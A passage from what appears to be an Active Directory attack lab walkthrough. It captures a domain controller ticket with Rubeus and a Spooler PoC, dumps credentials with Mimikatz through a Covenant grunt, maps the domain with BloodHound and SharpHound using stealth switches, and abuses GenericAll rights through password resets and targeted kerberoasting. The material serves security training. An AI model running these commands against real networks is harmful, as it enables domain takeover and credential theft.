<figure class="highlight smali"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs smali">powershell .\rubeus.exe<span class="hljs-built_in"> monitor </span>/interval:5 &gt;&gt; r.log<br></code></pre></div></td></tr></table></figure>

<p>Let’s note down the PID, we will need it for later:</p>
<figure class="highlight pgsql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs pgsql">powershell <span class="hljs-keyword">Get</span>-Process -<span class="hljs-type">name</span> Rubeus<br></code></pre></div></td></tr></table></figure>

<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image114.png" srcset="/img/loading.gif"></p>
<p>Now let’s run the Spooler Bug PoC:</p>
<figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">powershell</span> .\spo.exe child-dc<span class="hljs-number">01</span> win<span class="hljs-number">10</span>-web<br></code></pre></div></td></tr></table></figure>

<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image115.png" srcset="/img/loading.gif"></p>
<p>You might encounter issues related to fact that Rubeus is still running, like below one:</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image116.png" srcset="/img/loading.gif"></p>
<p>You might need to end Rubeus PID forcefully due to locking the log file.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image117.png" srcset="/img/loading.gif"></p>
<p>Now you should be able to download r.log. As you see some base64-encoded data on the screen, go to Data tab and download the file:</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image118.png" srcset="/img/loading.gif"></p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image119.png" srcset="/img/loading.gif"></p>
<p>If you did everything correctly, you will have a ticket dumped in your log file!</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image120.png" srcset="/img/loading.gif"></p>
<p>Using that ticket, it is possible to impersonate the domain controller machine account. Copy the base64 blob and go to grunt and Tasks. You might want to remove spaces and newlines, so before using the ticket we saved it in a file and piped to the tr command, as follows.</p>
<figure class="highlight vim"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs vim"><span class="hljs-keyword">cat</span> ticket | <span class="hljs-keyword">tr</span> -d <span class="hljs-string">&quot;\n&quot;</span> | <span class="hljs-keyword">tr</span> -d <span class="hljs-string">&quot; &quot;</span><br></code></pre></div></td></tr></table></figure>

<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image121.png" srcset="/img/loading.gif"></p>
<p>Issue task Rubeus with argument ptt /ticket:[Base64]</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image122.png" srcset="/img/loading.gif"></p>
<p>You should be able to see the output:</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image123.png" srcset="/img/loading.gif"></p>
<p>You can now use another Rubeus task or go to “Interact” tab to use “rubeus klist”</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image124.png" srcset="/img/loading.gif"></p>
<p>Under Client Name you can see the owner, which in that case is “CHILD-DC01$” machine account.</p>
<h2 id="Setting-up-Bloodhound"><a href="#Setting-up-Bloodhound" class="headerlink" title="Setting up Bloodhound"></a>Setting up Bloodhound</h2><p>In order to set up BloodHound we will use a local Windows 10 VM. First, install Neo4j Community Server (<a target="_blank" rel="noopener" href="https://neo4j.com/download-center/#community">https://neo4j.com/download-center/#community</a>). Neo4j depends on Java (<a target="_blank" rel="noopener" href="https://www.java.com/en/download/">https://www.java.com/en/download/</a>).</p>
<p>Unpack the downloaded archive and start the neo4j.bat file. It is recommended to run it from an elevated command prompt, otherwise you will not be able to see any errors messages.</p>
<p>Despite having Java installed, if you got the below error message…</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image125.png" srcset="/img/loading.gif"></p>
<p>… you may need to change your JAVA_HOME environment variable to your jre11+ directory like in below picture.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image126.png" srcset="/img/loading.gif"></p>
<p>If everything goes well, you should see something similar to the below screenshot in your console:</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image127.png" srcset="/img/loading.gif"></p>
<p>Now, go to <a target="_blank" rel="noopener" href="http://127.0.0.1:7474/">http://127.0.0.1:7474</a> in your browser to display the neo4j console.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image128.png" srcset="/img/loading.gif"></p>
<p>Default credentials are neo4j:neo4j and you will be asked to change them after first login.</p>
<p>Now, let’s download Bloodhound. Go to <a target="_blank" rel="noopener" href="https://github.com/BloodHoundAD/BloodHound/releases">https://github.com/BloodHoundAD/BloodHound/releases</a></p>
<p>and download the latest one.</p>
<p>We used the x64 version:</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image129.png" srcset="/img/loading.gif"></p>
<p>Unpack the archive and start BloodHound.exe. You will be asked for credentials for the neo4j database you’ve just set up.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image130.png" srcset="/img/loading.gif"></p>
<p>So far there’s an empty screen since we didn’t feed any data to Bloodhound. Let’s go back to the Covenant agent to collect some information from the Grunt.</p>
<p>Let’s go to <a target="_blank" rel="noopener" href="https://github.com/BloodHoundAD/SharpHound3">https://github.com/BloodHoundAD/SharpHound3</a> and download SharpHound.</p>
<p>We will use the precompiled release that can be downloaded here:</p>
<p><a target="_blank" rel="noopener" href="https://github.com/BloodHoundAD/BloodHound/tree/master/Ingestors">https://github.com/BloodHoundAD/BloodHound/tree/master/Ingestors</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/BloodHoundAD/BloodHound/blob/master/Ingestors/SharpHound.exe">https://github.com/BloodHoundAD/BloodHound/blob/master/Ingestors/SharpHound.exe</a></p>
<p>If you would like to build it from source, let us give you several hints on errors you might encounter:</p>
<ul>
<li>  First, you as you unpack the archive and try to Build the solution, you might encounter several errors related to NuGet. If this happens, right click on the solution and choose Manage NuGet packages. Then in the top right corner of screen, click “Restore”.</li>
</ul>
<p>Another error you might encounter is “Please use language version 7.1 or greater”.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image131.png" srcset="/img/loading.gif"></p>
<ul>
<li>  Second thing is that you need at least Visual Studio 2019. It is due to msbuild version, for SharpHound3, 16.0 is required and VS2017 uses versions 15.x</li>
</ul>
<p>Let’s move SharpHound.exe to our Kali attacker machine. Then, go to the Grunt and choose Task -&gt; Assembly, and fill it as per below screenshot:</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image132.png" srcset="/img/loading.gif"></p>
<p>Remember that you need to run in a High integrity context!</p>
<p>After executing the task, you should be able to view its output at the “Taskings” tab:</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image133.png" srcset="/img/loading.gif"></p>
<p>Copy the file name from the log. It will be needed in the Download task immediately after you retrieve the Bloodhound output:</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image134.png" srcset="/img/loading.gif"></p>
<p>Next, go to “Data” and “Downloads”. You can now download the file and transfer it to the machine where BloodHound is installed.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image135.png" srcset="/img/loading.gif"></p>
<p>Before we move on with that file, let’s take look at a tab named “Credentials”. Let’s try to obtain some credentials to be able to see them in that place. Remember to run in high integrity!</p>
<p>Go to the Grunt, Task, and choose Mimikatz (with the default command)</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image136.png" srcset="/img/loading.gif"></p>
<p>You should be able to get the output in Taskings:</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image137.png" srcset="/img/loading.gif"></p>
<p>Instead of copying it, simply go back to “Data” and choose tab “Credentials”.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image138.png" srcset="/img/loading.gif"></p>
<p>You can observe that the gathered credentials are present in there.</p>
<p>Back to the BloodHound log, download the .zip archive and move it to Windows Bloodhound machine you have set up (with neo4j and java). As Bloodhound is started, you can simply drag &amp; drop the .zip archive onto it. After a short while you could be able to work on the data. Click on the menu icon on the top left of the screen to be able to issue queries:</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image139.png" srcset="/img/loading.gif"></p>
<p>Click on “Queries”. There you can make use of some pre-built BloodHound functionalities to analyze the collected information.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image140.png" srcset="/img/loading.gif"></p>
<p>Let’s choose “Find shortest Paths to Domain Admins”</p>
<p>As the current user has administrative rights on the DC, it can directly become a DA too, which can be seen on the graph.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image141.png" srcset="/img/loading.gif"></p>
<p>If you click on the icon representing an object on the graph (e.g. on the victim user icon), you will be able to see detailed information about it in the “Node info” pane:</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image142.png" srcset="/img/loading.gif"></p>
<h2 id="Using-Bloodhound"><a href="#Using-Bloodhound" class="headerlink" title="Using Bloodhound"></a>Using Bloodhound</h2><p>We’ve already showed you how to setup bloodhound. Just to summarize, bloodhound allows to visualize domain member objects on graphs, which is achieved by its Ingestor module (that you run on a remote PC with some domain credentials to collect information about that domain) and a Neo4j module which allows to generate the graphs based on collected information.</p>
<h3 id="Bloodhound-Ingestors"><a href="#Bloodhound-Ingestors" class="headerlink" title="Bloodhound Ingestors"></a>Bloodhound Ingestors</h3><p>Ingestors are simply bloodhound modules designed to collect data from remote systems. Two publicly available builds are constantly being published on GitHub repository <a target="_blank" rel="noopener" href="https://github.com/BloodHoundAD/BloodHound/tree/master/Ingestors">https://github.com/BloodHoundAD/BloodHound/tree/master/Ingestors</a></p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image143.png" srcset="/img/loading.gif"></p>
<p>You can find both .NET and PowerShell versions there. In our lab, we used the .NET version of Sharphound (which is a bloodhound ingestor) to collect data from the lab domain.</p>
<h3 id="Bloodhound-Collection-methods"><a href="#Bloodhound-Collection-methods" class="headerlink" title="Bloodhound Collection methods"></a>Bloodhound Collection methods</h3><p>When uploading the ingestor module, we used the default collection method which performs the following enumeration steps:</p>
<ul>
<li><p>  Default Enumeration</p>
</li>
<li><p>  ACL Enumeration</p>
</li>
<li><p>  ObjectProps Enumeration</p>
</li>
<li><p>  Container Enumeration</p>
</li>
</ul>
<p>If you want to specify detailed collection methods, you can use a command line argument similar to the below</p>
<figure class="highlight mipsasm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mipsasm">Invoke-<span class="hljs-keyword">BloodHound </span>-CollectionMethod ACL,ObjectProps<br></code></pre></div></td></tr></table></figure>

<p>Which will narrow the collection methods only to ACLs and Object properties.</p>
<p>Apart from choosing what method we want to use to collect data, you should also be aware that some monitoring solutions might be in place. Thus, you might want to operate with less noise when collecting bloodhound data.</p>
<p>You can change the frequency of the requests sent by BloodHound by using command line switches such as</p>
<figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">Invoke</span>-BloodHound -Throttle <span class="hljs-number">1500</span> -Jitter <span class="hljs-number">10</span><br></code></pre></div></td></tr></table></figure>

<p>Throttle is the value of pause between subsequent requests and Jitter is the variance in %.</p>
<p>Another method to increase the stealthiness of theBloodHound ingestor is to minimize its disk footprint. This can be achieved using the below command line switches:</p>
<p><strong>-CompressData -RemoveCSV</strong> and <strong>-NoSaveCache</strong></p>
<p>As the data is collected into a .zip file, you can download it from remote machine and drag&amp;drop on to your Bloodhound local instance to load it into underlying neo4j database.</p>
<h3 id="Bloodhound-interface"><a href="#Bloodhound-interface" class="headerlink" title="Bloodhound interface"></a>Bloodhound interface</h3><p>As soon as new data is loaded into the database, you can explore the panel in the left top corner to interact with it. In the rest of the screen you will see a graph which is a result of the last executed query.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image144.png" srcset="/img/loading.gif"></p>
<p>The database info contains general statistics about the database you loaded from the .zip file. If you try to open the .zip, you can notice that it simply contains multiple json files with information collected by the bloodhound ingestor.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image145.png" srcset="/img/loading.gif"></p>
<p>You can also clear the database in order to load new one.</p>
<p>If you click on a node on the graph, you will be able to display node info which is the second tab of the menu. For example, we clicked on the “Analyst1” user node and now various statistics are available under the “node info” menu.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image146.png" srcset="/img/loading.gif"></p>
<p>In that menu, you can click on any number. For example, let’s click on “Reachable high value targets”</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image147.png" srcset="/img/loading.gif"></p>
<p>You will see new graph where the current node is a starting point. In that case, you can now view all objects that are considered “high value”</p>
<p>If you right click on a node, you can edit its properties</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image148.png" srcset="/img/loading.gif"></p>
<p>For example, you can mark it as high value one.</p>
<p>The last tab is for queries, which includes some prebuilt visualizations that might be useful in your domain exploration. Note, that if you set a certain node as a “starting node”, then you will be able to see those graphs from its perspective.</p>
<p>However, the prebuilt queries offer only visualization of small portion of the domain data, so you might want to build your own queries.</p>
<h3 id="Bloodhound-custom-queries"><a href="#Bloodhound-custom-queries" class="headerlink" title="Bloodhound custom queries"></a>Bloodhound custom queries</h3><p>In order to create non-standard queries, you can click on the pencil icon at “Custom Queries”</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image149.png" srcset="/img/loading.gif"></p>
<p>Customqueries.json will appear in your default system editor for json files. In our case it is visual studio but you can use any editor you like. Keep in mind that it will be more helpful if it has syntax highlighting.</p>
<p><a target="_blank" rel="noopener" href="https://github.com/SadProcessor/Cheats/blob/master/DogWhispererV2.md">https://github.com/SadProcessor/Cheats/blob/master/DogWhispererV2.md</a></p>
<p>A Bloodhound query matches (like SQL SELECT) some nodes, and that match can be als be subject to conditions. After a match is made, a result should be returned. On the graph you will see only the returned items.</p>
<p>For example:</p>
<figure class="highlight excel"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs excel"><span class="hljs-built_in">MATCH</span> (<span class="hljs-built_in">n</span>) RETURN <span class="hljs-built_in">n</span><br></code></pre></div></td></tr></table></figure>

<p>Will return all nodes.</p>
<p>Let’s add one query to the json file</p>
<figure class="highlight json"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs json">&#123;<br>   <span class="hljs-attr">&quot;name&quot;</span>:<span class="hljs-string">&quot;CUSTOM&quot;</span>,<br>   <span class="hljs-attr">&quot;queryList&quot;</span>:[<br>      &#123;<br>         <span class="hljs-attr">&quot;final&quot;</span>:<span class="hljs-literal">true</span>,<br>         <span class="hljs-attr">&quot;query&quot;</span>:<span class="hljs-string">&quot;MATCH (n:User) RETURN n&quot;</span><br>      &#125;<br>   ]<br>&#125;<br></code></pre></div></td></tr></table></figure>

<p>If you want to add more queries, separate them with a comma. We now save the file and click on the refresh button at the “Custom Queries” section. A query named “CUSTOM” will show up.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image150.png" srcset="/img/loading.gif"></p>
<p>This how you select multiple objects, however, they are not grouped on a graph now.</p>
<p>Consider the following query which lists all domain admins:</p>
<figure class="highlight json"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs json">&#123;<br>   <span class="hljs-attr">&quot;name&quot;</span>:<span class="hljs-string">&quot;CUSTOM&quot;</span>,<br>   <span class="hljs-attr">&quot;queryList&quot;</span>:[<br>      &#123;<br>         <span class="hljs-attr">&quot;final&quot;</span>:<span class="hljs-literal">true</span>,<br>         <span class="hljs-attr">&quot;query&quot;</span>:<span class="hljs-string">&quot;MATCH (n:Group) WHERE n.name =~ \&quot;(?i).*DOMAIN ADMINS.*\&quot; WITH n MATCH (n)&lt;-[r:MemberOf*1..]-(m) RETURN n,r,m&quot;</span><br>      &#125;<br>   ]<br>&#125;<br></code></pre></div></td></tr></table></figure>

<p>Here we match object n that is a Group type and its name matches the above regular expression - contains string “domain admins”. Moreover, we would like another condition to be matched and visualized - an object that is a member of that group. As there are three objects included in the visualization (the group, the fact of being its member and the member itself), all of them have to be returned from query. The result is:</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image151.png" srcset="/img/loading.gif"></p>
<p>The bloodhound „magic” happens in the graph definition. The language of graphs is named Cypher and its most interesting part is the dependency visualization which looks like below:</p>
<figure class="highlight scss"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs scss">(This)-<span class="hljs-selector-attr">[IsConnectedTo]</span>-&gt;(That)<br></code></pre></div></td></tr></table></figure>

<p>Consider following query:</p>
<figure class="highlight less"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs less"><span class="hljs-selector-tag">MATCH</span> (<span class="hljs-attribute">u</span>:User)<br><span class="hljs-selector-tag">MATCH</span> (<span class="hljs-attribute">g</span>:Group &#123;name: ADMINISTRATORS@ELS-CHILD.ELS.LOCAL&#125;)<br><span class="hljs-selector-tag">MATCH</span> (u)<span class="hljs-selector-tag">-</span><span class="hljs-selector-attr">[MemberOf]</span><span class="hljs-selector-tag">-</span>&gt;(g)<br><span class="hljs-selector-tag">RETURN</span> <span class="hljs-selector-tag">u</span><br></code></pre></div></td></tr></table></figure>

<p>Here we first ask for all users and store in variable U, then for a group called “<a href="mailto:&#65;&#x44;&#77;&#x49;&#x4e;&#73;&#x53;&#84;&#x52;&#x41;&#x54;&#79;&#x52;&#83;&#x40;&#68;&#x4f;&#77;&#65;&#x49;&#x4e;&#x2e;&#x4c;&#x4f;&#x43;&#65;&#76;">&#65;&#x44;&#77;&#x49;&#x4e;&#73;&#x53;&#84;&#x52;&#x41;&#x54;&#79;&#x52;&#83;&#x40;&#68;&#x4f;&#77;&#65;&#x49;&#x4e;&#x2e;&#x4c;&#x4f;&#x43;&#65;&#76;</a>“ and we store in variable G. From that list of users U, we filter who is member of the specified group G, and finally return these User nodes.</p>
<figure class="highlight pgsql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs pgsql">MATCH (u:<span class="hljs-keyword">User</span>)-[MemberOf]-&gt;(g:<span class="hljs-keyword">Group</span> &#123;<span class="hljs-type">name</span>: &quot;ADMINISTRATORS@ELS-CHILD.ELS.LOCAL&quot;&#125;) <br><span class="hljs-keyword">RETURN</span> u<br></code></pre></div></td></tr></table></figure>

<p>Which can be incorporated into customqueries.json as</p>
<figure class="highlight json"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs json">&#123;<br>   <span class="hljs-attr">&quot;name&quot;</span>:<span class="hljs-string">&quot;CUSTOM&quot;</span>,<br>   <span class="hljs-attr">&quot;queryList&quot;</span>:[<br>      &#123;<br>         <span class="hljs-attr">&quot;final&quot;</span>:<span class="hljs-literal">true</span>,<br>         <span class="hljs-attr">&quot;query&quot;</span>:<span class="hljs-string">&quot;MATCH (u:User)-[MemberOf]-&gt;(g:Group &#123;name: \&quot;ADMINISTRATORS@ELS-CHILD.ELS.LOCAL\&#125;) RETURN u&quot;</span><br>      &#125;<br>   ]<br>&#125;<br></code></pre></div></td></tr></table></figure>

<p>The result may help us display all users that are members of the administrators group.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image152.png" srcset="/img/loading.gif"></p>
<p>You can also find full documentation on BloodHound in the “Dog Whisperer’s handbook” available publicly at:</p>
<p><a target="_blank" rel="noopener" href="https://www.ernw.de/download/BloodHoundWorkshop/ERNW_DogWhispererHandbook.pdf">https://www.ernw.de/download/BloodHoundWorkshop/ERNW_DogWhispererHandbook.pdf</a></p>
<h2 id="Mapping-GPO-misconfigurations-using-Sharphound"><a href="#Mapping-GPO-misconfigurations-using-Sharphound" class="headerlink" title="Mapping GPO misconfigurations using Sharphound"></a>Mapping GPO misconfigurations using Sharphound</h2><p>Sharphound which has already been presented can also be a helpful tool during ACL exploitation. Below, we are loading it using the Assembly task.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image153.png" srcset="/img/loading.gif"></p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image154.png" srcset="/img/loading.gif"></p>
<p>As per the output, we can collect the resulting .zip file using the Download task. Later, the file is available in the Data tab. We will download it and upload it to the Bloodhound instance on our local machine.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image155.png" srcset="/img/loading.gif"></p>
<p>The below screenshot shows a visualization of the query “shortest path to valuable targets”</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image156.png" srcset="/img/loading.gif"></p>
<p>There are too many objects to see it clearly, so we can for example look for just “shortest path to domain admins”</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image157.png" srcset="/img/loading.gif"></p>
<p>We can use both Bloodhound and Invoke-AclScanner to identify potential vulnerabilities within the domain. While Bloodhound shows us the big picture, invoke-aclscanner shows us single misconfigurations.</p>
<h2 id="Domain-ACL-Exploitation"><a href="#Domain-ACL-Exploitation" class="headerlink" title="Domain ACL Exploitation"></a>Domain ACL Exploitation</h2><p>During domain reconnaissance you might encounter a situation when you have some level of permissions over another domain user. Most likely this might occur when you, as a domain user, are member of a privileged group which is in charge of managing some part of the domain members. Of course, there could be various reasons that resulted in such a configuration.</p>
<p>In order to detect such configurations, you can use PowerView. We will use an Analyst1 grunt with a medium integrity in order to retrieve interesting information regarding the domain.</p>
<p>First step will be to use the Analyst1 grunt to import PowerView via the Task PowershellImport.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image158.png" srcset="/img/loading.gif"></p>
<p>Next, we can use PowerView’s utility - <strong>Invoke-AclScanner</strong>:</p>
<figure class="highlight nginx"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nginx"><span class="hljs-attribute">powershell</span> Invoke-AclScanner | <span class="hljs-literal">select</span> ObjectDN,ActiveDirectoryRights,IdentityReference<br></code></pre></div></td></tr></table></figure>

<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image159.png" srcset="/img/loading.gif"></p>
<p>The presented output shows that as analyst1, who is also member of the operators group, has GenericAll permissions on users Analyst Manager and Analyst Manager2. Let’s try to abuse that fact.</p>
<p>The first, but less stealthy, option is to simply change the password of the user we have GenericAll permission to. This can be done through a simple “net user” command:</p>
<figure class="highlight crmsh"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs crmsh">powershell net <span class="hljs-keyword">user</span> <span class="hljs-title">analystm</span> Summer2020! /domain<br></code></pre></div></td></tr></table></figure>

<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image160.png" srcset="/img/loading.gif"></p>
<figure class="highlight jboss-cli"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs jboss-cli">ShellRunAs <span class="hljs-string">/shellcommand</span>:<span class="hljs-string">&quot;whoami&quot;</span> <span class="hljs-string">/username</span>:<span class="hljs-string">&quot;analystm&quot;</span> <span class="hljs-string">/domain</span>:<span class="hljs-string">&quot;ELS-CHILD&quot;</span> <span class="hljs-string">/password</span>:<span class="hljs-string">&quot;Summer2020!&quot;</span><br></code></pre></div></td></tr></table></figure>

<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image161.png" srcset="/img/loading.gif"></p>
<p>This allowed us to take over the account. The second option involves cracking the user password which is more difficult but a lot harder to detect. Using the genericall permission we are allowed to set a SPN for that user. We can do this by using a simple powershell command. This time we will do it for analystm2 which we also control:</p>
<figure class="highlight stylus"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stylus">powershell setspn<span class="hljs-selector-class">.exe</span> -<span class="hljs-selector-tag">a</span> HTTP/jumpbox els-child\analystm2<br></code></pre></div></td></tr></table></figure>

<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image162.png" srcset="/img/loading.gif"></p>
<p>Then, we can use Rubeus kerberoast to retrieve the hash for kerberoasting. Note that this attack vector will not be effective if the user has a strong password as we still rely on cracking in order to obtain the password in plaintext.</p>
<figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css">rubeus kerberoast /format<span class="hljs-selector-pseudo">:has</span>hcat<br></code></pre></div></td></tr></table></figure>

<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image163.png" srcset="/img/loading.gif"></p>
<p>The spn can be deleted using almost the same command, just using the -d switch:</p>
<figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">powershell</span> setspn.exe -d HTTP/jumpbox els-child\analystm<span class="hljs-number">2</span><br></code></pre></div></td></tr></table></figure>

<p>We can supply the hash to Hashcat, as follows.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/36c9cc04-7663-45bf-9c9b-78ec1c3f139e/image164.png" srcset="/img/loading.gif"></p>
<p>We are using a rockyou.txt which was added all passwords already found within the lab domain. After a while, the password is cracked.</p>
